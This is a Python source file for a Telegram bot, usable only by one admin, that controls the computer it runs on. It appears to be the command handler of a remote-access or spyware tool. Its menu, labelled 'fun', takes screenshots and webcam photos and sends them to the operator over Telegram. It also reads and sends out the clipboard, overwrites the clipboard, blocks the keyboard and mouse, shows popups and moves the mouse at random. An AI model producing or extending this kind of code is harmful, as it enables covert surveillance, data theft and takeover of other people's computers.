import os

from aiogram import F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import FSInputFile
from environs import Env

from Funcs import fun_commands, funcs
from Funcs.state import return_message
from Keyboardz.keyboard_fun import keyBoard_funs, keyboard_wybor
from message_processing import fun_messages as fs

env = Env()
env.read_env()
ADMIN_ID = env.int('id')

router = Router()


class FunStates(StatesGroup):
    waiting_for_action = State()
    waiting_for_input = State()


@router.message(Command("funfun"), F.from_user.id == ADMIN_ID)
async def cmd_fun_start(message: types.Message, state: FSMContext):
    await state.set_state(FunStates.waiting_for_action)
    await message.answer(
        "Глава интересное. Выберите действие:",
        reply_markup=keyBoard_funs
    )


@router.message(FunStates.waiting_for_action, F.from_user.id == ADMIN_ID)
async def process_fun_action(message: types.Message, state: FSMContext):
    chosen_action = message.text

    await state.update_data(choosen=chosen_action)

    if chosen_action == "Скриншот экрана":
        await message.answer("Делаю скриншот...")
        fun_commands.FunFuncs.screenshot()

        path = f'{funcs.PATH}ss.png'
        try:
            photo_file = FSInputFile(path)
            await message.answer_photo(photo_file)
            await message.answer(return_message("Скриншот готов\n"), reply_markup=types.ReplyKeyboardRemove())
        except Exception as e:
            await message.answer(f"Ошибка отправки: {e}")
        finally:
            if os.path.exists(path):
                os.remove(path)

        await state.clear()

    elif chosen_action == "Фото с камеры":
        await message.answer("Делаю фото...")
        fun_commands.FunFuncs.get_photo_from_camera()

        path = f'{funcs.PATH}cam.png'
        try:
            photo_file = FSInputFile(path)
            await message.answer_photo(photo_file)
            await message.answer(return_message("Фото готово\n"), reply_markup=types.ReplyKeyboardRemove())
        except Exception as e:
            await message.answer(f"Ошибка камеры или отправки: {e}")
        finally:
            if os.path.exists(path):
                os.remove(path)

        await state.clear()

    elif chosen_action == "Блок мышки и клавы":
        fun_commands.FunFuncs.block_input(True)
        await message.answer(
            return_message("Заблокировано (Клавиатура и Мышь)\n"),
            reply_markup=types.ReplyKeyboardRemove()
        )
        await state.clear()

    elif chosen_action == "Анблок мышки и клавы":
        fun_commands.FunFuncs.block_input(False)
        await message.answer(
            return_message("Разблокировано\n"),
            reply_markup=types.ReplyKeyboardRemove()
        )
        await state.clear()

    elif chosen_action == "Вывод окна":
        await state.set_state(FunStates.waiting_for_input)

        await message.answer(
            fs.FunMessages.fun_segment(chosen_action),
            reply_markup=keyboard_wybor
        )

    elif chosen_action == "Рандом с мышкой":
        await state.set_state(FunStates.waiting_for_input)
        await message.answer(
            fs.FunMessages.fun_segment(chosen_action),
            reply_markup=types.ReplyKeyboardRemove()
        )

    elif chosen_action == "Получить буфер обмена":
        text = await fun_commands.FunFuncs.get_clipboard()

        if not text:
            await message.answer("Буфер обмена пуст.")
            await state.clear()
            return

        # Лимит Телеграм ~4096 символов
        if len(text) > 4000:
            # ОТПРАВКА ФАЙЛОМ ---
            await message.answer("Текст слишком длинный, формирую файл...")

            # Используем путь из твоего конфига
            file_path = f"{funcs.PATH}clipboard.txt"

            try:
                # Записываем текст в файл
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(text)

                # Отправляем файл
                file_to_send = FSInputFile(file_path)
                await message.answer_document(
                    file_to_send,
                    caption="📋 <b>Буфер обмена (файл)</b>",
                    parse_mode="HTML"
                )
            except Exception as e:
                await message.answer(f"Ошибка при создании файла: {e}")
            finally:
                if os.path.exists(file_path):
                    os.remove(file_path)
        else:
            try:
                await message.answer(f"📋 <b>Буфер обмена:</b>\n<code>{text}</code>", parse_mode="HTML")
            except Exception:
                await message.answer(f"📋 Буфер обмена:\n{text}")

        await state.clear()

    elif chosen_action in ["Записать в буфер обмена"]:
        await state.set_state(FunStates.waiting_for_input)
        await message.answer(
            fs.FunMessages.fun_segment(chosen_action),
            reply_markup=types.ReplyKeyboardRemove()
        )

    else:
        await state.set_state(FunStates.waiting_for_input)
        await message.answer(
            fs.FunMessages.fun_segment(chosen_action),
            reply_markup=types.ReplyKeyboardRemove()
        )


@router.message(FunStates.waiting_for_input, F.from_user.id == ADMIN_ID)
async def process_fun_input(message: types.Message, state: FSMContext):
    input_value = message.text

    data = await state.get_data()
    action = data.get('choosen')

    if action == "Рандом с мышкой":
        try:
            fun_commands.FunFuncs.mouse_rand(input_value)
            await message.answer(return_message("Процесс завершен.\n"))
        except Exception as e:
            await message.answer(f"Ошибка выполнения: {e}")

    elif action == "Вывод окна":
        fun_commands.FunFuncs.window_warning(input_value)
        await message.answer(return_message("Окно выведено.\n"))

    elif action == "Записать в буфер обмена":
        try:
            await fun_commands.FunFuncs.set_clipboard(input_value)
            await message.answer(return_message("Текст записан в буфер обмена.\n"))
        except Exception as e:
            await message.answer(f"Ошибка записи в буфер обмена: {e}")

    # await message.answer("Готово", reply_markup=types.ReplyKeyboardRemove())
    await state.clear()
